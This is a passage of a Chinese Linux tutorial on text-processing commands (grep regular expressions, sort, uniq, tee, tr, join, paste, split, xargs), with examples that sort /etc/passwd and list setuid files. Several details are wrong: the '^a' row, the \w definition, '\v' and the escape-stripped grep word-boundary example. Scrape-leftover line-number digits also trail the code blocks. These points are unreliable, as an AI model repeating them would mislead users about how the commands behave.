<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>^a</td>
<td>行首,搜寻以 m 开头的行；grep -n ‘^a’ 1.txt</td>
</tr>
<tr>
<td>ke$</td>
<td>行尾,搜寻以 ke 结束的行；grep -n ‘ke$’ 1.txt</td>
</tr>
<tr>
<td>[Ss]igna[Ll]</td>
<td>匹配 [] 里中一系列字符中的一个；搜寻匹配单词signal、signaL、Signal、SignaL的行；grep -n ‘[Ss]igna[Ll]’ 1.txt</td>
</tr>
<tr>
<td>.</td>
<td>.匹配一个非换行符的字符；grep -n ‘e.e’ 1.txt可以匹配 eee，eae，eve，但是不匹配 ee，eaae；</td>
</tr>
<tr>
<td>*</td>
<td>匹配零个或多个先前字符</td>
</tr>
<tr>
<td>[^]</td>
<td>匹配一个不在指定范围内的字符</td>
</tr>
<tr>
<td><code>\(..\)</code></td>
<td>标记匹配字符</td>
</tr>
<tr>
<td>\</td>
<td>锚定单词的开始</td>
</tr>
<tr>
<td><code>\&lt;</code></td>
<td>锚定单词的开头</td>
</tr>
<tr>
<td><code>\&gt;</code></td>
<td>锚定单词的结束</td>
</tr>
<tr>
<td><code>x\&#123;m\&#125;</code></td>
<td>重复字符x，m次</td>
</tr>
<tr>
<td><code>x\&#123;m,\&#125;</code></td>
<td>重复字符x,至少m次</td>
</tr>
<tr>
<td><code>x\&#123;m,n\&#125;</code></td>
<td>重复字符x，至少m次，不多于n次</td>
</tr>
<tr>
<td>\w</td>
<td>匹配文字和数字字符，也就是[A-Za-z0-9]</td>
</tr>
<tr>
<td>\b</td>
<td>单词锁定符</td>
</tr>
</tbody>
</table>
<p>实例：显示所有以“h”结尾的行<br>
grep h$<br>
匹配所有以“a”开头且以“e”结尾的，中间包含2个字符的单词<br>
grep ‘&lt;a…e&gt;’<br>
显示所有包含一个”y”或”h”字符的行<br>
grep [yh]<br>
显示不包含字母a~k 且后紧跟“pple”的单词</p>
<figure class="highlight cos"><table><tr><td class="code"><pre><span class="line">grep [<span class="symbol">^a</span>-<span class="keyword">k</span>]pple</span><br></pre></td></tr></table></figure>
<p>从系统词典中选择所有以“c”开头且以“o”结尾的单词<code>grep '\&lt;c.*o\&gt;'</code><br>
找出一个文件中或者输出中找到包含<code>*</code>的行<code>grep '\*'</code><br>
显示所有包含每个字符串至少有20个连续字母的单词的行<br>
<code>grep [a-Z]\&#123;20,\&#125;</code></p>
<h4 id="sort-排序">sort - 排序</h4>
<p><strong>语法：</strong></p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sort</span> [-fbMnrtuk] [<span class="built_in">file</span> <span class="keyword">or</span> <span class="keyword">stdin</span>]</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p><strong>参数说明</strong>：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-f ：忽略大小写的差异，例如 A 与 a 视为编码相同；</p>
</li>
<li class="lvl-2">
<p>-b ：忽略最前面的空格符部分；</p>
</li>
<li class="lvl-2">
<p>-M ：以月份的名字来排序，例如 JAN, DEC 等等的排序方法；</p>
</li>
<li class="lvl-2">
<p>-n ：使用『纯数字』进行排序(默认是以文字型态来排序的)；</p>
</li>
<li class="lvl-2">
<p>-r ：反向排序；</p>
</li>
<li class="lvl-2">
<p>-u ：就是 uniq ，相同的数据中，仅出现一行代表；</p>
</li>
<li class="lvl-2">
<p>-t ：分隔符，默认是用 [tab] 键来分隔；</p>
</li>
<li class="lvl-2">
<p>-k ：以哪个区间 (field) 来进行排序</p>
</li>
</ul>
<p>默认是以第一个字符升序排序:</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cat /etc/passwd | sort </span></span><br><span class="line"><span class="symbol">adm:</span><span class="symbol">x:</span><span class="number">3</span><span class="symbol">:</span><span class="number">4</span><span class="symbol">:adm</span><span class="symbol">:/var/adm</span><span class="symbol">:/sbin/nologin</span></span><br><span class="line">avahi-<span class="symbol">autoipd:</span><span class="symbol">x:</span><span class="number">100</span><span class="symbol">:</span><span class="number">156</span><span class="symbol">:avahi-autoipd</span><span class="symbol">:/var/lib/avahi-autoipd</span><span class="symbol">:/sbin/nologin</span></span><br><span class="line"><span class="symbol">avahi:</span><span class="symbol">x:</span><span class="number">70</span><span class="symbol">:</span><span class="number">70</span><span class="symbol">:Avahi</span> <span class="symbol">daemon:</span>/<span class="symbol">:/sbin/nologin</span></span><br><span class="line"><span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/sbin/nologin</span></span><br><span class="line">......</span><br><span class="line"><span class="number">123456</span></span><br></pre></td></tr></table></figure>
<p>以第3列排序：</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">[root<span class="variable">@www</span> ~]<span class="comment"># cat /etc/passwd | sort -t &#x27;:&#x27; -k 3</span></span><br><span class="line"><span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br><span class="line"><span class="symbol">uucp:</span><span class="symbol">x:</span><span class="number">10</span><span class="symbol">:</span><span class="number">14</span><span class="symbol">:uucp</span><span class="symbol">:/var/spool/uucp</span><span class="symbol">:/sbin/nologin</span></span><br><span class="line"><span class="symbol">operator:</span><span class="symbol">x:</span><span class="number">11</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:operator</span><span class="symbol">:/root</span><span class="symbol">:/sbin/nologin</span></span><br><span class="line"><span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/sbin/nologin</span></span><br><span class="line"><span class="symbol">games:</span><span class="symbol">x:</span><span class="number">12</span><span class="symbol">:</span><span class="number">100</span><span class="symbol">:games</span><span class="symbol">:/usr/games</span><span class="symbol">:/sbin/nologin</span></span><br><span class="line"><span class="number">123456</span></span><br></pre></td></tr></table></figure>
<p>使用数字排序：</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd | sort -t <span class="string">&#x27;:&#x27;</span> -k <span class="number">3</span>n</span><br><span class="line"><span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br><span class="line"><span class="symbol">daemon:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:daemon</span><span class="symbol">:/usr/sbin</span><span class="symbol">:/bin/sh</span></span><br><span class="line"><span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">2</span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/bin/sh</span></span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></figure>
<p>倒序排序：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd | <span class="built_in">sort</span> -t <span class="string">&#x27;:&#x27;</span> -k 3nr</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">ntp:x:106:113::/home/ntp:/bin/false</span><br><span class="line">messagebus:x:105:109::/var/run/dbus:/bin/false</span><br><span class="line">sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">或者</span><br><span class="line"><span class="built_in">cat</span> /etc/passwd | <span class="built_in">sort</span> -t <span class="string">&#x27;:&#x27;</span> -k 3 -nr</span><br><span class="line">1234567</span><br></pre></td></tr></table></figure>
<p>先以第六个域的第2个字符到第4个字符进行正向排序，再基于第一个域进行反向排序：</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd |  sort -t <span class="string">&#x27;:&#x27;</span> -k <span class="number">6.2</span>,<span class="number">6.4</span> -k <span class="number">1</span>r      </span><br><span class="line"><span class="symbol">sync:</span><span class="symbol">x:</span><span class="number">4</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:sync</span><span class="symbol">:/bin</span><span class="symbol">:/bin/sync</span></span><br><span class="line"><span class="symbol">proxy:</span><span class="symbol">x:</span><span class="number">13</span><span class="symbol">:</span><span class="number">13</span><span class="symbol">:proxy</span><span class="symbol">:/bin</span><span class="symbol">:/bin/sh</span></span><br><span class="line"><span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">2</span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/bin/sh</span></span><br><span class="line"><span class="symbol">sys:</span><span class="symbol">x:</span><span class="number">3</span><span class="symbol">:</span><span class="number">3</span><span class="symbol">:sys</span><span class="symbol">:/dev</span><span class="symbol">:/bin/sh</span></span><br><span class="line"><span class="number">12345</span></span><br></pre></td></tr></table></figure>
<p>查看/etc/passwd有多少个shell:</p>
<p>方法对/etc/passwd的第七个域排序并去重，然后统计行数：</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">[root<span class="variable">@VM_0_9_centos</span> ~]<span class="comment"># cat /etc/passwd |  sort -t&#x27;:&#x27; -k 7 -u</span></span><br><span class="line"><span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br><span class="line"><span class="symbol">syslog:</span><span class="symbol">x:</span><span class="number">996</span><span class="symbol">:</span><span class="number">994</span><span class="symbol">:</span><span class="symbol">:/home/syslog</span><span class="symbol">:/bin/false</span></span><br><span class="line"><span class="symbol">sync:</span><span class="symbol">x:</span><span class="number">5</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:sync</span><span class="symbol">:/sbin</span><span class="symbol">:/bin/sync</span></span><br><span class="line"><span class="symbol">halt:</span><span class="symbol">x:</span><span class="number">7</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:halt</span><span class="symbol">:/sbin</span><span class="symbol">:/sbin/halt</span></span><br><span class="line"><span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/sbin/nologin</span></span><br><span class="line"><span class="symbol">shutdown:</span><span class="symbol">x:</span><span class="number">6</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:shutdown</span><span class="symbol">:/sbin</span><span class="symbol">:/sbin/shutdown</span></span><br><span class="line">[root<span class="variable">@VM_0_9_centos</span> ~]<span class="comment"># cat /etc/passwd |  sort -t&#x27;:&#x27; -k 7 -u|wc -l</span></span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="number">123456789</span></span><br></pre></td></tr></table></figure>
<h4 id="uniq-去重">uniq - 去重</h4>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">选项与参数：</span><br><span class="line"><span class="deletion">-i   ：忽略大小写字符的不同；</span></span><br><span class="line"><span class="deletion">-c  ：进行计数</span></span><br><span class="line"><span class="deletion">-u  ：只显示唯一的行</span></span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
<p>该命令用于排完序之后，对排序结果进行去重</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line"><span class="keyword">python</span>@xxx:~$ last | cut -d <span class="string">&#x27; &#x27;</span> -f <span class="number">1</span>  | <span class="keyword">sort</span> | uniq</span><br><span class="line"></span><br><span class="line">haha</span><br><span class="line"><span class="keyword">python</span></span><br><span class="line">reboot</span><br><span class="line">wtmp</span><br><span class="line"><span class="keyword">python</span>@xxx:~$ last | cut -d <span class="string">&#x27; &#x27;</span> -f <span class="number">1</span>  | <span class="keyword">sort</span> | uniq -c</span><br><span class="line">      <span class="number">1</span> </span><br><span class="line">      <span class="number">2</span> haha</span><br><span class="line">     <span class="number">22</span> <span class="keyword">python</span></span><br><span class="line">      <span class="number">7</span> reboot</span><br><span class="line">      <span class="number">1</span> wtmp</span><br><span class="line"><span class="number">123456789101112</span></span><br></pre></td></tr></table></figure>
<p>排序文件，默认是去重：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">cat</span> words | <span class="built_in">sort</span> |<span class="built_in">uniq</span></span></span><br><span class="line">friend</span><br><span class="line">hello</span><br><span class="line">world</span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
<p>排序之后删除了重复行，同时在行首位置输出该行重复的次数：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">sort</span> testfile | <span class="built_in">uniq</span> -c</span></span><br><span class="line">1 friend</span><br><span class="line">3 hello</span><br><span class="line">2 world</span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
<p>仅显示存在重复的行，并在行首显示该行重复的次数：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">sort</span> testfile | <span class="built_in">uniq</span> -dc</span></span><br><span class="line">3 hello</span><br><span class="line">2 world</span><br><span class="line">123</span><br></pre></td></tr></table></figure>
<p>仅显示不重复的行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sort</span> testfile | <span class="built_in">uniq</span> -u</span><br><span class="line">friend</span><br><span class="line">12</span><br></pre></td></tr></table></figure>
<h4 id="tee-同时输出多个文件">tee - 同时输出多个文件</h4>
<p>从标准输入设备读取数据，将其内容输出到标准输出设备，同时保存成文件。</p>
<p>一般情况下用重定向实现，需要同时输出多个文件时可以使用该命令。</p>
<p><strong>参数</strong>：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-a或–append 　附加到既有文件的后面，而非覆盖它．</p>
</li>
</ul>
<p>将输出同时保存到多个文件中，同时将输出内容显示到控制台：</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">python<span class="variable">@xxx</span><span class="symbol">:~/test</span><span class="variable">$ </span>echo <span class="string">&quot;hello world&quot;</span>|tee f1 f2 </span><br><span class="line">hello world</span><br><span class="line">python<span class="variable">@xxx</span><span class="symbol">:~/test</span><span class="variable">$ </span>cat f1</span><br><span class="line">hello world</span><br><span class="line">python<span class="variable">@xxx</span><span class="symbol">:~/test</span><span class="variable">$ </span>echo <span class="string">&quot;hello world&quot;</span>|tee f1 f2 -a</span><br><span class="line">hello world</span><br><span class="line">python<span class="variable">@xxx</span><span class="symbol">:~/test</span><span class="variable">$ </span>cat f1</span><br><span class="line">hello world</span><br><span class="line">hello world</span><br><span class="line"><span class="number">123456789</span></span><br></pre></td></tr></table></figure>
<h4 id="tr-替换指定的字符">tr - 替换指定的字符</h4>
<p>不指定参数时，即表示替换指定的字符为另一个字符，支持指定的字符集合。</p>
<p><strong>参数说明：</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-d, --delete：删除指定的字符</p>
</li>
<li class="lvl-2">
<p>-s, --squeeze-repeats：缩减连续重复的字符成指定的单个字符</p>
</li>
</ul>
<p>字符集合的范围：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>\NNN 八进制值的字符 NNN (1 to 3 为八进制值的字符)</p>
</li>
<li class="lvl-2">
<p>\ 反斜杠</p>
</li>
<li class="lvl-2">
<p>\a Ctrl-G 铃声</p>
</li>
<li class="lvl-2">
<p>\b Ctrl-H 退格符</p>
</li>
<li class="lvl-2">
<p>\f Ctrl-L 走行换页</p>
</li>
<li class="lvl-2">
<p>\n Ctrl-J 新行</p>
</li>
<li class="lvl-2">
<p>\r Ctrl-M 回车</p>
</li>
<li class="lvl-2">
<p>\t Ctrl-I tab键</p>
</li>
<li class="lvl-2">
<p>\v Ctrl-X 水平制表符</p>
</li>
<li class="lvl-2">
<p>CHAR1-CHAR2 ：字符范围从 CHAR1 到 CHAR2 的指定，范围的指定以 ASCII 码的次序为基础，只能由小到大，不能由大到小。</p>
</li>
<li class="lvl-2">
<p>[CHAR*] ：这是 SET2 专用的设定，功能是重复指定的字符到与 SET1 相同长度为止</p>
</li>
<li class="lvl-2">
<p>[CHAR*REPEAT] ：这也是 SET2 专用的设定，功能是重复指定的字符到设定的 REPEAT 次数为止(REPEAT 的数字采 8 进位制计算，以 0 为开始)</p>
</li>
<li class="lvl-2">
<p>[:alnum:] ：所有字母字符与数字</p>
</li>
<li class="lvl-2">
<p>[:alpha:] ：所有字母字符</p>
</li>
<li class="lvl-2">
<p>[:blank:] ：所有水平空格</p>
</li>
<li class="lvl-2">
<p>[:cntrl:] ：所有控制字符</p>
</li>
<li class="lvl-2">
<p>[:digit:] ：所有数字</p>
</li>
<li class="lvl-2">
<p>[:graph:] ：所有可打印的字符(不包含空格符)</p>
</li>
<li class="lvl-2">
<p>[:lower:] ：所有小写字母</p>
</li>
<li class="lvl-2">
<p>[:print:] ：所有可打印的字符(包含空格符)</p>
</li>
<li class="lvl-2">
<p>[:punct:] ：所有标点字符</p>
</li>
<li class="lvl-2">
<p>[:space:] ：所有水平与垂直空格符</p>
</li>
<li class="lvl-2">
<p>[:upper:] ：所有大写字母</p>
</li>
<li class="lvl-2">
<p>[:xdigit:] ：所有 16 进位制的数字</p>
</li>
<li class="lvl-2">
<p>[=CHAR=] ：所有符合指定的字符(等号里的 CHAR，代表你可自订的字符)</p>
</li>
</ul>
<p>将文件testfile中的小写字母全部转换成大写字母：</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">cat</span> <span class="selector-tag">testfile</span> |<span class="selector-tag">tr</span> <span class="selector-tag">a</span><span class="selector-tag">-z</span> <span class="selector-tag">A</span><span class="selector-tag">-Z</span> </span><br><span class="line">或</span><br><span class="line"><span class="selector-tag">cat</span> <span class="selector-tag">testfile</span> |<span class="selector-tag">tr</span> <span class="selector-attr">[:lower:]</span> <span class="selector-attr">[:upper:]</span> </span><br><span class="line"><span class="number">123</span></span><br></pre></td></tr></table></figure>
<p>缩减连续重复的字符成指定的单个字符：</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">python<span class="variable">@xxx</span><span class="symbol">:~/test</span><span class="variable">$ </span>cat t</span><br><span class="line">dddddddsssssdd</span><br><span class="line">eeeeeeeeee</span><br><span class="line">aaaaaaaaaaaaaa</span><br><span class="line">vvvvvvvvvvvvvv</span><br><span class="line">python<span class="variable">@xxx</span><span class="symbol">:~/test</span><span class="variable">$ </span>cat t|tr -s <span class="string">&#x27;se&#x27;</span></span><br><span class="line">dddddddsdd</span><br><span class="line">e</span><br><span class="line">aaaaaaaaaaaaaa</span><br><span class="line">vvvvvvvvvvvvvv</span><br><span class="line">python<span class="variable">@xxx</span><span class="symbol">:~/test</span><span class="variable">$ </span>cat t|tr -s <span class="string">&#x27;sdeav&#x27;</span></span><br><span class="line">dsd</span><br><span class="line">e</span><br><span class="line">a</span><br><span class="line">v</span><br><span class="line"><span class="number">123456789101112131415</span></span><br></pre></td></tr></table></figure>
<p>删除指定的字符：</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">python<span class="variable">@xxx</span><span class="symbol">:~/test</span><span class="variable">$ </span>cat t|tr -d <span class="string">&#x27;dv&#x27;</span></span><br><span class="line">sssss</span><br><span class="line">eeeeeeeeee</span><br><span class="line">aaaaaaaaaaaaaa</span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></figure>
<h4 id="join-文件按行连接">join - 文件按行连接</h4>
<p>将两个文件中指定栏位相同的行连接起来。即按照两个文件中共同拥有的某一列，将对应的行拼接成一行。</p>
<p>注意：在使用join之前所处理的文件要事先经过排序。</p>
<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line">$ cat testfile_1</span><br><span class="line">Hello 95 #例如，本例中第一列为姓名，第二列为数额  </span><br><span class="line">Linux 85  </span><br><span class="line"><span class="keyword">test </span>30  </span><br><span class="line">cmd@hdd-desktop:~$ cat testfile_2</span><br><span class="line">Hello 2005 #例如，本例中第一列为姓名，第二列为年份  </span><br><span class="line">Linux 2009  </span><br><span class="line"><span class="keyword">test </span>2006 </span><br><span class="line">12345678</span><br></pre></td></tr></table></figure>
<p>使用join命令，将两个文件连接：</p>
<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line">$ join testfile_1 testfile_2 #连接testfile_1、testfile_2中的内容  </span><br><span class="line">Hello 95 2005 #连接后显示的内容  </span><br><span class="line">Linux 85 2009  </span><br><span class="line"><span class="keyword">test </span>30 2006 </span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
<p>两个文件互换，输出结果的变化：</p>
<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line">$ join testfile_2 testfile_1 #改变文件顺序连接两个文件  </span><br><span class="line">Hello 2005 95 #连接后显示的内容  </span><br><span class="line">Linux 2009 85  </span><br><span class="line"><span class="keyword">test </span>2006 30 </span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
<p><strong>参数</strong>：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-a&lt;1或2&gt; 除了显示原来的输出内容之外，还显示指令文件中没有相同栏位的行。</p>
</li>
<li class="lvl-2">
<p>-e&lt;字符串&gt; 若[文件1]与[文件2]中找不到指定的栏位，则在输出中填入选项中的字符串。</p>
</li>
<li class="lvl-2">
<p>-i或–igore-case 比较栏位内容时，忽略大小写的差异。</p>
</li>
<li class="lvl-2">
<p>-o&lt;格式&gt; 按照指定的格式来显示结果。</p>
</li>
<li class="lvl-2">
<p>-t&lt;字符&gt; 使用栏位的分隔字符。</p>
</li>
<li class="lvl-2">
<p>-v&lt;1或2&gt; 跟-a相同，但是只显示文件中没有相同栏位的行。</p>
</li>
<li class="lvl-2">
<p>-1&lt;栏位&gt; 连接[文件1]指定的栏位。</p>
</li>
<li class="lvl-2">
<p>-2&lt;栏位&gt; 连接[文件2]指定的栏位。</p>
</li>
</ul>
<h4 id="paste-将多个文件对应行链接在一起">paste-将多个文件对应行链接在一起</h4>
<p>paste 指令会把每个文件以列对列的方式，一列列地加以合并。</p>
<p>语法：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">paste <span class="selector-attr">[-s]</span><span class="selector-attr">[-d &lt;间隔字符&gt;]</span><span class="selector-attr">[文件...]</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p><strong>参数</strong>：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-d&lt;间隔字符&gt;或–delimiters=&lt;间隔字符&gt; 　用指定的间隔字符取代跳格字符。</p>
</li>
<li class="lvl-2">
<p>-s或–serial 　串列进行而非平行处理。</p>
</li>
<li class="lvl-2">
<p>[文件…] 指定操作的文件路径</p>
</li>
</ul>
<p>使用paste指令将文件&quot;file&quot;、“testfile”、&quot;testfile1&quot;进行合并，输入如下命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> file                  <span class="comment">#file文件的内容</span></span>  </span><br><span class="line">xiongdan 200  </span><br><span class="line">lihaihui 233  </span><br><span class="line">lymlrl 231  </span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> testfile              <span class="comment">#testfile文件的内容</span></span>  </span><br><span class="line">liangyuanm  ss  </span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> testfile1             <span class="comment">#testfile1文件的内容</span></span>  </span><br><span class="line">huanggai 56  </span><br><span class="line">zhixi 73 </span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">paste</span> file testfile testfile1</span></span><br><span class="line">xiongdan 200    liangyuanm ss   huanggai 56</span><br><span class="line">lihaihui 233            zhixi 73</span><br><span class="line">lymlrl 231</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">paste</span> -d <span class="string">&#x27;:&#x27;</span> file testfile testfile1</span></span><br><span class="line">xiongdan 200:liangyuanm ss:huanggai 56</span><br><span class="line">lihaihui 233::zhixi 73</span><br><span class="line">lymlrl 231::</span><br><span class="line">1234567891011121314151617</span><br></pre></td></tr></table></figure>
<p>参数&quot;-s&quot;可以将一个文件中的多行数据合并为一行进行显示：</p>
<figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">$ paste -s file             <span class="comment">#合并指定文件的多行数据</span></span><br><span class="line">xiongdan<span class="number"> 200 </span>lihaihui<span class="number"> 233 </span>lymlrl<span class="number"> 231 </span></span><br><span class="line">12</span><br></pre></td></tr></table></figure>
<p>如果将文件位置改为-，表示接收标准输入：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> file |<span class="built_in">paste</span> testfile1 -</span></span><br><span class="line">huanggai 56     xiongdan 200</span><br><span class="line">zhixi 73        lihaihui 233</span><br><span class="line">        lymlrl 231</span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
<h4 id="split-文件切割">split - 文件切割</h4>
<p>split命令用于将一个文件分割成数个。</p>
<p>该指令将大文件分割成较小的文件，在默认情况下将按照每1000行切割成一个小文件。</p>
<p>语法：</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">split [-<span class="keyword">bl] </span>file <span class="keyword">prefix</span></span><br><span class="line"><span class="keyword"></span>-<span class="keyword">b: </span>以大小切割</span><br><span class="line">-l：以行数切割</span><br><span class="line"><span class="keyword">prefix：切割后文件的前缀</span></span><br><span class="line"><span class="keyword"></span><span class="number">1234</span></span><br></pre></td></tr></table></figure>
<p><strong>参数说明</strong>：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-&lt;行数&gt; : 指定每多少行切成一个小文件</p>
</li>
<li class="lvl-2">
<p>-b&lt;字节&gt; : 指定每多少字节切成一个小文件</p>
</li>
<li class="lvl-2">
<p>-C&lt;字节&gt; : 与参数&quot;-b&quot;相似，但是在切 割时将尽量维持每行的完整性</p>
</li>
<li class="lvl-2">
<p>[输出文件名] : 设置切割后文件的前置文件名， split会自动在前置文件名后再加上编号</p>
</li>
</ul>
<p>使用指令&quot;split&quot;将文件&quot;README&quot;每6行切割成一个文件，输入如下命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">split</span> -6 README       <span class="comment">#将README文件每六行分割成一个文件</span></span> </span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span>                                <span class="comment">#执行ls指令</span></span>  </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">获得当前目录结构</span></span><br><span class="line">README xaa xad xag xab xae xah xac xaf xai</span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
<p>以上命令执行后，指令&quot;split&quot;会将原来的大文件&quot;README&quot;切割成多个以&quot;x&quot;开头的小文件。而在这些小文件中，每个文件都只有6行内容。</p>
<p>以大小切割：</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">$ ls -<span class="keyword">lh </span><span class="keyword">disease.dmp</span></span><br><span class="line"><span class="keyword"></span>-rwxr-xr-x <span class="number">1</span> root root <span class="number">122</span>M <span class="keyword">Jul </span> <span class="number">4</span>  <span class="number">2013</span> <span class="keyword">disease.dmp</span></span><br><span class="line"><span class="keyword"></span>$ split -<span class="keyword">b </span><span class="number">50</span>m <span class="keyword">disease.dmp </span><span class="keyword">disease.dmp</span></span><br><span class="line"><span class="keyword"></span>$ ls -<span class="keyword">lh </span><span class="keyword">disease.dmp*</span></span><br><span class="line"><span class="keyword"></span>-rwxr-xr-x <span class="number">1</span> root root <span class="number">122</span>M <span class="keyword">Jul </span> <span class="number">4</span>  <span class="number">2013</span> <span class="keyword">disease.dmp</span></span><br><span class="line"><span class="keyword"></span>-rw-r--r-- <span class="number">1</span> root root  <span class="number">50</span>M <span class="keyword">Jan </span> <span class="number">9</span> <span class="number">16</span>:<span class="number">10</span> <span class="keyword">disease.dmpaa</span></span><br><span class="line"><span class="keyword"></span>-rw-r--r-- <span class="number">1</span> root root  <span class="number">50</span>M <span class="keyword">Jan </span> <span class="number">9</span> <span class="number">16</span>:<span class="number">10</span> <span class="keyword">disease.dmpab</span></span><br><span class="line"><span class="keyword"></span>-rw-r--r-- <span class="number">1</span> root root  <span class="number">22</span>M <span class="keyword">Jan </span> <span class="number">9</span> <span class="number">16</span>:<span class="number">10</span> <span class="keyword">disease.dmpac</span></span><br><span class="line"><span class="keyword"></span><span class="number">12345678</span></span><br></pre></td></tr></table></figure>
<h4 id="xargs-参数代换">xargs - 参数代换</h4>
<p>不是所有的命令都支持管道，如ls，对于不支持管道的命令，可以通过xargs让其有管道命令的效果，如下所示：</p>
<figure class="highlight tap"><table><tr><td class="code"><pre><span class="line"><span class="comment"># find /sbin -perm +7000 | xargs ls -l</span></span><br><span class="line">-rwsr-x---<span class="number"> 1 </span>root ecryptfs<span class="number"> 19896 </span>Feb<span class="number"> 23 </span><span class="number"> 2012 </span>/sbin/mount.ecryptfs_private</span><br><span class="line">-rwsr-xr-x<span class="number"> 1 </span>root root    <span class="number"> 75496 </span>Jan <span class="number"> 9 </span><span class="number"> 2013 </span>/sbin/mount.nfs</span><br><span class="line">-rwsr-xr-x<span class="number"> 1 </span>root root    <span class="number"> 75504 </span>Jan <span class="number"> 9 </span><span class="number"> 2013 </span>/sbin/mount.nfs4</span><br><span class="line">-rwxr-sr-x<span class="number"> 1 </span>root root     <span class="number"> 8544 </span>Feb<span class="number"> 22 </span><span class="number"> 2012 </span>/sbin/netreport</span><br><span class="line">-rwsr-xr-x<span class="number"> 1 